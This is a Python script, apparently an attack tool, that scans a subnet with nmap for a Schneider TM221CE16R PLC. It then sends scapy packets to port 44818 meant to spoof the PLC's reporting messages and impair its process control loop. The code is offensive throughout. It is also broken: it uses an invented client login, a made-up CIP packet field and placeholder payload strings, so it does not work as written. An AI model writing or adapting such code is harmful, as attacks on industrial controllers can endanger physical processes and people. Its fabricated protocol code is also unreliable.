import subprocess
from scapy.all import *
import time
import threading
from pycomm import CIP

# Define the subnet to scan
subnet = '192.168.1.0/24'

def find_plc_ip(subnet):
    try:
        output = subprocess.check_output(['nmap', '-sP', subnet]).decode('utf-8')
        for line in output.split('\n'):
            if 'TM221CE16R' in line:  
                ip_address = line.split(' ')[-1]
                return ip_address
    except Exception as e:
        print(f"Failed to find PLC IP: {e}")
        return None

def spoof_reporting_message(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Define the reporting message to spoof
        reporting_message = 'REPORT_IO_VALUES'
        spoofed_message = 'REPORT_IO_VALUES_SPOOFED'
        
        # Use scapy to spoof the reporting message
        packet = IP(dst=plc_ip)/TCP(dport=44818)/CIP(message=spoofed_message)
        send(packet, verbose=0)
        
        print(f"Reporting message '{reporting_message}' spoofed on PLC: {plc_ip}")
    except Exception as e:
        print(f"Failed to spoof reporting message: {e}")

def impair_process_control(plc_ip):
    try:
        # Create a CIP connection to the PLC
        cip_client = CIP.Client(plc_ip, 44818)
        
        # Login to the PLC
        cip_client.connect()
        cip_client.login()
        
        # Define the process control to impair
        process_control = 'CONTROL_LOOP'
        impaired_control = 'CONTROL_LOOP_IMPAIRED'
        
        # Use scapy to impair the process control
        packet = IP(dst=plc_ip)/TCP(dport=44818)/CIP(message=impaired_control)
        send(packet, verbose=0)
        
        print(f"Process control '{process_control}' impaired on PLC: {plc_ip}")
    except Exception as e:
        print(f"Failed to impair process control: {e}")

def main():
    plc_ip = find_plc_ip(subnet)
    if plc_ip:
        print(f"PLC IP Address: {plc_ip}")
        
        # Spoof the reporting message
        spoof_reporting_message(plc_ip)
        
        # Impair the process control
        impair_process_control(plc_ip)
    else:
        print("PLC not found.")

if __name__ == "__main__":
    main()